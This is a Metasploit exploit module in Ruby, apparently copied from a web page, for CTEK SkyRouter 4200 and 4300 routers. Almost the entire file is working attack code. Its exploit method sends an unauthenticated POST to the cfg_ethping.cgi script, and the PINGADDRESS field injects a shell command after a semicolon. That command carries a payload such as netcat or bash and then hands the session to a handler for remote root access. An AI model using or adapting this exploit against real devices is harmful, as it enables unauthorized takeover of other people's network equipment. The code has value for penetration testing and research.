# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = AverageRanking
 
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;CTEK SkyRouter 4200 and 4300 Command Execution&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits an unauthenticated remote root exploit within ctek SkyRouter 4200 and 4300.
            },
            &#039;Author&#039;         => [ &#039;savant42&#039; ],  #with module help from kos
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     => [ &#039;URL&#039;, &#039;http://dev.metasploit.com/redmine/issues/5610&#039;],
            &#039;Privileged&#039;     => false,
            &#039;Payload&#039;        =>
                {
                    &#039;DisableNops&#039; => true,
                    &#039;Space&#039;       => 1024,
                    &#039;Compat&#039;      =>
                        {
                            &#039;PayloadType&#039; => &#039;cmd&#039;,
                            &#039;RequiredCmd&#039; => &#039;generic perl telnet netcat-e bash&#039;,
                        }
                },
            &#039;Platform&#039;       => &#039;unix&#039;,
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
            &#039;DisclosureDate&#039; => &#039;Sep 8 2011&#039;, # CGI historical date :)
            &#039;DefaultTarget&#039; => 0))
 
    end
 
    def exploit
        post_data = "MYLINK=%2Fapps%2Fa3%2Fcfg_ethping.cgi&CMD=u&PINGADDRESS=;" + Rex::Text.uri_encode(payload.encoded) + "+%26"
        uri    = &#039;/apps/a3/cfg_ethping.cgi&#039;
        print_status("Sending HTTP request for #{uri}")
        res = send_request_cgi( {
            &#039;global&#039; => true,
            &#039;uri&#039;    => uri,
            &#039;method&#039; => "POST",
            &#039;data&#039; => post_data
        }, 30)
 
        if res
            print_status("The server responded with HTTP CODE #{res.code}")
        else
            print_status("The server did not respond to our request")
        end
 
        handler
    end
 
end



